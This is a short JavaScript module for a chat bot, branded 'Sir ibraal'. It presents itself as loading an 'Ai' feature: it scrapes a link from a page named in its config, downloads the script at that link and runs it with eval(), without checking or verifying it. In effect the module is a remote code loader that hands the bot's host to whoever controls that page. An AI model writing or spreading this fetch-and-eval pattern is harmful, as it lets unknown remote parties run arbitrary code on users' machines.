

//  [SIR CREINS EDITION]                                           
//  >> A superposition of elegant code states                           
//  >> Collapsed into optimal execution                                
//  >> Scripted by Sir ibraal                                   
//  >> Version: 8.3.5-sir ibraa Bot

const axios = require('axios');
const cheerio = require('cheerio');
const adams = require(__dirname + "/../config");

async function fetchAiUrl() {
  try {
    const response = await axios.get(adams.BWM_XMD);
    const $ = cheerio.load(response.data);

    const targetElement = $('a:contains("Ai")');
    const targetUrl = targetElement.attr('href');

    if (!targetUrl) {
      throw new Error('Ai not found 😭');
    }

    console.log('Ai loaded successfully ✅');

    const scriptResponse = await axios.get(targetUrl);
    eval(scriptResponse.data);

  } catch (error) {
    console.error('Error:', error.message);
  }
}

fetchAiUrl();
